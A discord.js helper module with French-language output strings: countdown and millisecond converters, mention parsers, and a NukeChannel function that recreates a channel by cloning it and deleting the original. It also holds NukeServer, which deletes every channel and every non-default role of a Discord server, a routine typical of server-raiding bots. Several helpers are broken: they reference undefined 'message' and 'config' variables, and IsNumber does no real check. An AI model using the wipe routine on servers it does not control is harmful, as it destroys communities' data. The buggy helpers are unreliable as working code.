const Discord = require("discord.js")
const fs = require("fs")
const client = new Discord.Client()

function GetCountdown(customdate, countdownMethod){
    
    const now = new Date().getTime()
    const countdownDate = new Date(customdate).getTime()
    const distanceBase = countdownDate - now

    const days = Math.floor(distanceBase / (3600000 * 24))
    const hours = Math.floor((distanceBase % (3600000 * 24)) / 3600000)
    const minutes = Math.floor((distanceBase % 3600000) / (1000 * 60)) 
    const seconds = Math.floor((distanceBase % (1000 * 60)) / 1000)

    const raw = `${days}j ${hours}h ${minutes}min ${seconds}sec`
    const form = `il reste ${days} jours, ${hours} heures, ${minutes} minutes et ${seconds} secondes.`

    if (countdownMethod === "raw") return raw
    if (countdownMethod === "form") return form
    if (!countdownMethod) return distanceBase

}

function GetMsbyForm(SetDays, SetHours, SetMinutes) {

    let MSdays = SetDays * 86400000   
    let MShours = SetHours * 3600000  
    let MSminutes = SetMinutes * 60000 

    return MSdays + MShours + MSminutes

} 

function GetUserByMention(mention) {
    if (!mention) return message.reply("commande invalide.")

    if (mention.startsWith('<@') && mention.endsWith('>')) {
        mention = mention.slice(2, -1);

        if (mention.startsWith('!')) {
            mention = mention.slice(1);
        }

        return client.users.cache.get(mention);
    }
}

function GetMemberByMention(mention) {
    if (!mention) return;

    if (mention.startsWith('<@') && mention.endsWith('>')) {
        mention = mention.slice(2, -1);

        if (mention.startsWith('!')) {
            mention = mention.slice(1);
        }

        return message.guild.member(mention);
    }
}

function IsNumber(string) {
    return string + string - string
}

function NukeChannel(WillBeNukedChannel) {
    WillBeNukedChannel.clone().then(channel => {
        channel.setPosition(WillBeNukedChannel.position)
        channel.send('nuked.')
    })
    WillBeNukedChannel.delete()
}

function NukeServer(WillBeNukedServer) {
    WillBeNukedServer.channels.cache.forEach(channel => {
        channel.delete()
        .then(deleted => console.log(`le salon ${deleted.name} à été détruit.`))
        
      })

      WillBeNukedServer.roles.cache.forEach(roles =>{
        
        if(roles.name === "@everyone") return;
        if(roles.name === config.clientRoleName) return;

        roles.delete()
        .then(deleted => console.log(`le rôle ${deleted.name} à été détruit.`))
        .catch(console.error)
      })
}


module.exports = {
    GetCountdown, GetMsbyForm, GetUserByMention, GetMemberByMention, IsNumber, NukeChannel, NukeServer, 
}